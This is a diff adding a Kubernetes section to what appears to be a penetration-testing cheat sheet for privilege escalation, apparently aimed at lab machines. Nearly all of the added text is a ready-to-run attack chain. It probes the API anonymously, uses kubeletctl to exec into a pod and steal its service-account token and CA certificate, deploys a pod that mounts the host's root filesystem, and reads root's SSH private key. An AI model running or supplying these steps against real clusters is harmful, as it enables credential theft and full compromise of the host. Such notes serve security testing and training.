@@ -78,3 +78,53 @@ Users within the disk group have full access to any devices contained within /de
 
 # ADM
 Members of the adm group are able to read all logs stored in /var/log. 
+
+# Kubernetes
+Identifying
+```
+# Annonymous auth
+curl https://10.129.10.11:6443 -k
+
+# Recon
+kubeletctl -i --server 10.129.10.11 scan rce
+```
+
+Priv Esc
+```
+# Extracting TOken
+kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+
+# Extracting Certification
+kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+
+# List Privileges
+export token=`cat k8.token`
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
+
+# Creating .yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+
+# Creating new Pod
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
+
+# Escalation
+kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+```
